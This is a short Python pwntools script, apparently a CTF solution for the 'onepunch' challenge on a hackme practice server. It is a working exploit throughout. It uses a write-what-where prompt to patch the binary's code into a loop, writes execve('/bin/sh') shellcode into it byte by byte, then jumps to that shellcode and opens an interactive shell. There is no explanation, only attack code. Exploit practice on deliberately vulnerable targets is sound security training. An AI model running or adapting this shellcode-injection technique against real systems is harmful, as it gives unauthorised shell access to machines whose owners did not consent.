#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"

if sys.argv[1] == "l":
    io = process("./onepunch")
else:
    io = remote("hackme.inndy.tw", 7718)

def patch(addr, val):
    io.sendlineafter("Where What?", "%s %s" % (hex(addr), str(val)))

info("Step 1: patch cyclic")
patch(0x400768, 0xB4)

info("Step 2: write shellcode")
shellcode = asm(shellcraft.execve("/bin/sh"))
addr = 0x400769
for i, j in enumerate(shellcode):
    patch(addr + i, ord(j))

info("Step 3: goto shellcode")
patch(0x400768, 0xff)
io.interactive()
io.close()
